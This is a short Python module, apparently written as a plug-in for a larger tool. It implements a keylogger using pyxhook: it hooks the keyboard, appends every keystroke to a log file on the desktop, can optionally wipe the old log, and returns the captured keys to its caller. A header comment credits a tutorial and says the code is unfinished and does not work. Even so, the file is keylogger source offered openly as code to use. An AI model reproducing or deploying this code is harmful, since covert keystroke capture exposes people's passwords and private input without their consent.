# Source used: https://www.geeksforgeeks.org/design-a-keylogger-in-python/
# WIP - DOES NOT WORK, DO NOT USE!
import os
import pyxhook
from rich import print as rprint


def run(**args):
    rprint("[*] starting keylogger.")
    
    log_file = os.environ.get(
        'pylogger_file',
        os.path.expanduser('~/Desktop/file.log')
    )

    cancel_key = ord(
        os.environ.get(
            'pylogger_cancel',
            '`'
        )[0]
    )

    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(log_file)
        except EnvironmentError:
            pass

    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()
    try:
        new_hook.start()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        msg = 'Error while catching events:\n {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

    with open(log_file, 'r') as f:
        log = f.read()
    return log